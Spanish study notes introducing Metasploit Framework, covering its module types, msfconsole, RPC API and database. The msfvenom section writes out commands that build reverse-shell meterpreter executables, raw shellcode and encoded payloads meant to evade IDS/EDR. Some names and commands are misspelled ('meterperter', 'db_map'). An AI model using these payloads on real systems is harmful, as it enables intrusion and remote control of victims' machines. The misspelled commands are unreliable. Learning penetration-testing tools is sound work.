# What is Metasploit Framework?

**Metasploit Framework** (**MSF**) es un framwrok de explotación modular, orientado a facilitar el desarrollo, integración y ejecución de expoits, payloads, scanners y utilidades de post-explotación. Está re-escrito mayormente en Ruby y su diseño es modular, lo que nos indica que se compone de *modules* como:

- Exploit.
- Payload.
- Auxilliary.
- Post.
- Encoder.
- Nops.

Así como *handlers*, *sessions* y una base de datos para gestionar activos, credenciales y sesiones.

![[Pasted image 20250923180058.png]]
###### MSF Module Locations

*MSF* almacena los módulos dentro del directorio `/usr/share/metasploit-framework/modules` en sistemas Linux. Mientras que los módulos especificos del usuario son almacenados dentro del directorio `~/.ms4/modules` de un sistema Linux.

----
# [[Msfconsole]]

Esta herramienta es la *interfaz CLI interactiva* y la más utilizada. Proporciona autocompletado, ayuda, workspaces, history y ejecución de módulos. Algunos de los comandos más basicos en este punto son:

Algunas de las funcionalidades avanzadas incluyen:

- **Workspaces**: Asilar datos por objeto (`workspace -a {name}`, `workspace {name} `).
- **Jobs**: Ejecutar módulos en background con `exploit -j` o `run -j`.
- **Plugins**: Cargar funcionalidades extras descargables.

# Msfvenom

Herarmienta para generar payloads (Replacement de `msfpayload` / `msfencode`). Útil para crear binarios, scripts o raw payloads.

```bash
# Create a .exe with meterpreter reverse tcp (For Windows)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f exe -o shell.exe

# Shellcode raw (Hexadecimal)
msfvenom -p linux/x86/shell/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f raw | xxd -i

# Encoders 
msfvenom -p windows/meterperter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o enc.exe 

# -i Iteratios
# -f Format
# -o Output
```

# Msfrpcd / API

Permite controlar Metasploit remotamente (Scripts, integración con otras herarmientas). Hay bindings en Python/Perl/Ruby. Muchas herramientas externas se integran via API (Ej. *Armitage*).

# Msfdb / Data Base

Metasploit usa una base de datos (Postgres) para almacenar hosts, puertos, credenciales, vulnerabilidades y sesiones. En instalaciones modernas hay scripts `msfdb`para inicializar/gestionar la DB (`msfdb init`, `msfdb start`, etc.).

```bash
db_status
db_map -sV 10.10.10.0/24
hosts
services
creds
```

----
# Modules Types

Metasploit organiza los módulos en categorías como mencionamos antes, estas son:

- **Exploit**: Código que parovecha una vulnerabilidad. Tiene `targets`, `Payload Compatibility` y `Options`. Suele tener `check` si implementado.
- **Auxiliary**: Herramientas de diagnóstico o ataque que no generan una session necesariamente (Scanners, fuzzers, dos, sniffers, etc.).
- **Payload**: Código inyectado/ejecutado en la máquina objetivo (*Stagers* y *stages*). Ej. meterpreter.
	- *Stagers*: Pequeño payload inicial que establece conexión y descarga/ejecuta el stage.
	- *Stage*: Funcionalidad completa (Meterpreter, shell_reverse_tcp).
- **Post**: Módulos de post-explotación que operan sobre una `session` existente (Cred harvesting, escalation, persistence).
- **Encoder**: Transforman payloads para evadir filtros/IDS/EDRs.
- **Nop**: Instrucciones NOP (*No Operation*) para padding (Ej. `x86/sled`).